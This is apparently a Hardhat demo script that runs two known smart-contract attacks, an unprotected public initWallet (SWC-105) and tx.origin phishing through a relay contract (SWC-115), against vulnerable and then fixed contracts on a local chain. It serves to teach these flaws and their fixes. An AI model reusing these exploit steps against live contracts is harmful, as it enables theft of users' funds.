// Ether-loss demo: same attack on VULNERABLE then FIXED contracts.
//   npm run demo:wallet03 | demo:phishable | demo (both)
const { ethers } = require("hardhat");

const eth = (v) => ethers.formatEther(v) + " ETH";
const bal = (a) => ethers.provider.getBalance(a);
const banner = (t) => console.log("\n" + "=".repeat(66) + "\n" + t + "\n" + "=".repeat(66));

async function deploy(fqn, ...args) {
  const F = await ethers.getContractFactory(fqn);
  const c = await F.deploy(...args);
  await c.waitForDeployment();
  return c;
}

// Run an attack; return the error message if it reverted, else null.
async function attempt(fn) {
  try { await (await fn()).wait(); return null; }
  catch (e) { return (e.shortMessage || e.message).split("\n")[0]; }
}

// ---------- Case 1: Wallet03 (SWC-105, public initWallet) ----------
async function wallet03(kind) {
  const fixed = kind === "fixed";
  const [, victim, attacker] = await ethers.getSigners();
  const w = await deploy(`contracts/${kind}/Wallet03.sol:Wallet`);
  const addr = await w.getAddress();
  await (await w.connect(victim).deposit({ value: ethers.parseEther("10") })).wait();

  const a0 = await bal(attacker.address);
  console.log("Wallet balance (before):", eth(await bal(addr)));

  let err = null;
  if (!fixed) {
    await (await w.connect(attacker).initWallet()).wait();       // become creator
    console.log("Attacker called initWallet() -> now 'creator'");
  } else {
    console.log("initWallet() exists in fixed contract? ", w.interface.hasFunction("initWallet"));
  }
  err = await attempt(() => w.connect(attacker).migrateTo(attacker.address));

  console.log("Wallet balance (after): ", eth(await bal(addr)));
  const gain = (await bal(attacker.address)) - a0;
  console.log(err ? `Attack BLOCKED: ${err}` : "Attack SUCCEEDED");
  console.log("Attacker net gain:      ", eth(gain), "(minus gas)");
}

// ---------- Case 2: Phishable (SWC-115, tx.origin) ----------
async function phishable(kind) {
  const fixed = kind === "fixed";
  const [deployer, owner, attacker] = await ethers.getSigners();
  const p = await deploy(`contracts/${kind}/Phishable.sol:Phishable`, owner.address);
  const pAddr = await p.getAddress();
  await (await deployer.sendTransaction({ to: pAddr, value: ethers.parseEther("8") })).wait();
  const relay = await deploy("contracts/attack/AttackPhishable.sol:AttackPhishable", pAddr);
  // relay was deployed by `deployer`; attacker address = relay.attacker()
  const thief = await relay.attacker();

  const t0 = await bal(thief);
  console.log("Phishable balance (before):", eth(await bal(pAddr)));
  console.log("Owner is tricked into sending a tx to the attacker's relay contract...");

  const relayAddr = await relay.getAddress();
  const err = await attempt(() => owner.sendTransaction({ to: relayAddr, value: 0 }));

  console.log("Phishable balance (after): ", eth(await bal(pAddr)));
  console.log(err ? `Attack BLOCKED: ${err}` : "Attack SUCCEEDED");
  console.log("Attacker net gain:         ", eth((await bal(thief)) - t0));
}

async function main() {
  const which = (process.env.CASE || "all").toLowerCase();
  if (which === "all" || which === "wallet03") {
    banner("Wallet03 (SWC-105) — VULNERABLE: anyone can become creator");
    await wallet03("vulnerable");
    banner("Wallet03 (SWC-105) — FIXED: constructor sets creator");
    await wallet03("fixed");
  }
  if (which === "all" || which === "phishable") {
    banner("Phishable (SWC-115) — VULNERABLE: tx.origin auth");
    await phishable("vulnerable");
    banner("Phishable (SWC-115) — FIXED: msg.sender auth");
    await phishable("fixed");
  }
  console.log();
}

main().catch((e) => { console.error(e); process.exit(1); });
